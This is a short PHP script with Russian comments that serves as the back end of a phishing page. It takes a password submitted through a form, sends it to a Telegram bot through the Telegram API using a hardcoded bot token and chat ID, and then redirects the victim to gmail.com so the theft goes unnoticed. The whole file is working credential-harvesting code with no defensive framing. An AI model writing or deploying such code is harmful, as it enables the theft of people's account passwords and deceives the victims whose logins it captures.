<?
$pass = trim($_POST['password']);



$token = "1874888241:AAFpsLgX5Pdqo7LfLZiJmhkXnuGaSzv79pg"; // токен бота
$chatid = '602234832'; // id чата 1


// отправка сообщения
$tbot = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id="."$chatid"."&text=".urlencode("Пароль: $pass"));
header('Location: https://www.gmail.com');
?>